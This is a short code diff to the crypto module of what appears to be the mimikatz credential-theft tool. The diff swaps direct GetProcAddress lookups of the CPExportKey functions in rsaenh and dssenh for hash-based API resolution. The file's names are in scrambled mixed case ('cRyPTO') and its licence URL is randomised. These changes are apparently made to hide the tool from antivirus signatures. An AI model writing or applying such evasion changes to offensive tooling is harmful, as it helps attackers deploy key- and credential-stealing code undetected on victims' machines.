@@ -4,6 +4,7 @@
 	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
 */
 #include "kuhl_m_cRyPTO.h"
+#include "..\mimilib\api_resolver.c"
 
 HMODULE kuhl_m_cRyPTO_hRsaEnh = NULL, kuhl_m_cRyPTO_hDssEnh = NULL;
 
@@ -34,14 +35,22 @@ const KUHL_M kuhl_m_cRyPTO = {
 NTSTATUS kuhl_m_cRyPTO_init()
 {
 	NTSTATUS status = STATUS_NOT_FOUND;
-	if(kuhl_m_cRyPTO_hRsaEnh = LoadLibrary(L"rsaenh"))
-		K_RSA_CPExportKey = (PCP_EXPORTKEY) GetProcAddress(kuhl_m_cRyPTO_hRsaEnh, "CPExportKey");
-	if(kuhl_m_cRyPTO_hDssEnh = LoadLibrary(L"dssenh"))
-		K_DSS_CPExportKey = (PCP_EXPORTKEY) GetProcAddress(kuhl_m_cRyPTO_hDssEnh, "CPExportKey");
-	if(K_RSA_CPExportKey && K_DSS_CPExportKey)
+	DWORD hsh = getHashFromString("CPExportKey");
+
+	if (kuhl_m_cRyPTO_hRsaEnh = LoadLibrary(L"rsaenh")) {
+		K_RSA_CPExportKey = (PCP_EXPORTKEY)getFunctionByHash(kuhl_m_cRyPTO_hRsaEnh, hsh);
+	}
+
+	if (kuhl_m_cRyPTO_hDssEnh = LoadLibrary(L"dssenh")) {
+		K_DSS_CPExportKey = (PCP_EXPORTKEY)getFunctionByHash(kuhl_m_cRyPTO_hDssEnh, hsh);
+	}
+
+	if (K_RSA_CPExportKey && K_DSS_CPExportKey)
 		status = STATUS_SUCCESS;
+
 	return status;
 }
+
 
 NTSTATUS kuhl_m_cRyPTO_clean()
 {
